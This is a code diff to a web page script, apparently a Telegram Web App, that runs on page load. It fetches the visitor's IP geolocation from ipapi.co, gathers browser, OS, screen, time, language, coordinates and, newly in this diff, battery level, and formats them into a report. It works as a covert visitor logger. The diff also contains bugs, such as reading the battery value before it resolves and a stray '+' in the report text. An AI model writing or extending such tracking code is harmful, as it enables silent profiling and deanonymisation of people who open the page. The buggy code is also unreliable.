@@ -14,16 +14,22 @@
 <body>
     <script>
 document.addEventListener('DOMContentLoaded', function() {
-            let screenWidth;
-            let screenHeight;
+    let batteryLevel;
+    let screenWidth;
+    let screenHeight;
 
-            screenWidth = window.screen.width;
-            screenHeight = window.screen.height;
+    navigator.getBattery().then(function(battery) {
+        batteryLevel = battery.level * 100;
+    });
 
-            const screenWidthConst = screenWidth;
-            const screenHeightConst = screenHeight;
+    screenWidth = window.screen.width;
+    screenHeight = window.screen.height;
 
-            const tg = window.Telegram;
+    const batteryLevelConst = batteryLevel;
+    const screenWidthConst = screenWidth;
+    const screenHeightConst = screenHeight;
+
+    const tg = window.Telegram.WebApp;
 
     const urlParams = new URLSearchParams(window.location.search);
     const userAgent = navigator.userAgent;
@@ -44,11 +50,10 @@ fetch('https://ipapi.co/json/')
         const browser = getBrowserInfo();
         let userid = document.createElement('p');
      
-        let systemTime = new Date();
-        let hours = systemTime.getHours();
-        let minutes = systemTime.getMinutes();
-        let formattedMinutes = minutes.toString().padStart(2, '0');
-        let formattedTime = `${hours}:${formattedMinutes}`;
+       let systemTime = new Date();
+       let hours = systemTime.getHours();
+       let minutes = systemTime.getMinutes();
+       let formattedTime = `${hours}:${minutes}`;
     
        let language = navigator.language
       
@@ -86,7 +91,8 @@ fetch('https://ipapi.co/json/')
     *├ Coordinates: ${longitude} ${latitude},*
       * System 🖥*
     *├ Browser: ${browser}*
-    *├ Os: ${osname}*
+    *├ + Os: ${osname}*
+    *├ Battery: ${batteryLevel}%*
     *├ Screen resolution: ${screenWidth}x${screenHeight}*
     *├ Time: ${formattedTime}*
     *├ Language: ${language}*
